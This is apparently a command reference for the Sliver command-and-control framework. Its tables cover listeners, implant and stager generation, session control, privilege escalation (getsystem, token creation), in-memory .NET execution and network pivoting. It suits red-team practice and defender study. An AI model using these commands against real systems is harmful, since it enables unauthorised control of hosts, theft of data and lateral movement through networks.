# Sliver C2 Command Reference

Source: BishopFox Sliver Wiki (https://github.com/BishopFox/sliver/wiki) and console `help`.

## Server / multiplayer

| Command | Description |
|---------|-------------|
| `sliver-server` | Launch the server console (single-player) |
| `multiplayer --lport 31337` | Start the multiplayer gRPC listener |
| `new-operator --name NAME --lhost HOST --save FILE.cfg` | Generate an operator config file |
| `sliver-client import FILE.cfg` | Import operator config into the standalone client |
| `version` | Print server/client version |
| `jobs` / `jobs -k ID` | List / kill background listener jobs |

## Listeners (C2 jobs)

| Command | Description |
|---------|-------------|
| `mtls --lport 443` | Start a Mutual TLS listener |
| `https --lport 443` | Start an HTTPS listener |
| `http --lport 80` | Start a plain HTTP listener |
| `dns --domains c2.example.com. --lport 53` | Start a DNS listener for a delegated zone |
| `wg --lport 53` | Start a WireGuard listener |
| `stage-listener --url tcp://HOST:8443 --profile NAME` | Serve a staged payload |

## Implant generation

| Command / flag | Description |
|----------------|-------------|
| `generate --mtls HOST:443` | Generate a session implant over mTLS |
| `generate beacon --mtls HOST:443 --seconds 60 --jitter 30` | Generate a beacon with check-in interval and jitter |
| `--http HOST` / `--dns ZONE.` / `--wg HOST` | Select alternative C2 channels |
| `--os windows|linux|darwin` | Target operating system |
| `--arch amd64|386|arm64` | Target architecture |
| `--format exe|shellcode|shared|service|elf` | Output format |
| `--save PATH` | Output directory |
| `--tcp-pivot HOST:PORT` | Build an implant that connects to a TCP pivot |
| `generate stager --lhost HOST --lport PORT --arch amd64 --format c` | Generate a stager |
| `implants` / `implants rm NAME` | List / delete built implants |
| `profiles new ... NAME` / `profiles` | Save/list reusable implant profiles |

## Session / beacon interaction

| Command | Description |
|---------|-------------|
| `sessions` / `use SESSION_ID` | List / select interactive sessions |
| `beacons` / `use BEACON_ID` | List / select beacons |
| `info` | Implant metadata |
| `whoami` / `getprivs` | Identity and privileges |
| `ps -T` | Process list (with protection flags) |
| `ls`, `cd`, `download`, `upload`, `cat`, `rm` | File operations |
| `netstat`, `ifconfig` | Network state |
| `screenshot` | Capture screen |
| `execute -o CMD ARGS` | Run a command and capture output |
| `shell` | Interactive system shell (noisy) |
| `migrate PID` | Migrate into another process |
| `make-token -u DOMAIN\\user -p PASS` | Create an alternate logon token |
| `getsystem` | Attempt SYSTEM escalation |
| `kill` | Terminate the implant |

## Armory (extensions / aliases)

| Command | Description |
|---------|-------------|
| `armory` | List available packages |
| `armory install all` / `armory install NAME` | Install BOFs / .NET aliases |
| `armory update` | Update installed packages |
| `inline-execute-assembly PATH ARGS` | Run a .NET assembly in-memory |

## Pivoting

| Command | Description |
|---------|-------------|
| `socks5 start --port 1081` | Start a SOCKS5 proxy through the implant |
| `portfwd add --bind 127.0.0.1:LP --remote HOST:RP` | Add a port forward |
| `pivots tcp --bind 0.0.0.0:9898` | Start a TCP pivot listener on the beachhead |
| `pivots` | Show the pivot graph |
